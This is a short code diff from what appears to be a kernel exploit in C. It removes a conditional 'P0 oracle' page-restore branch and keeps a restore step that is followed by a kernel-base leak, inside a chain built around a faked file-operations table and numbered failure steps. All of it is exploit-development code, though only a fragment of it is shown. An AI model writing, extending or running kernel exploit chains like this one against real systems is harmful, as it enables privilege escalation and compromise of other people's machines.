@@ -387,19 +387,12 @@ if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     goto fail;
   }
 
-  #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  if (!restore_p0_oracle_pages(fd)) {
-    cfi_last_step = 10;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-#else
   if (!restore_slide_boot_id(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
     goto fail;
   }
-#endif
+
   if (!leak_kernel_base(fd)) {
     cfi_last_step = 9;
     cfi_last_errno = errno;
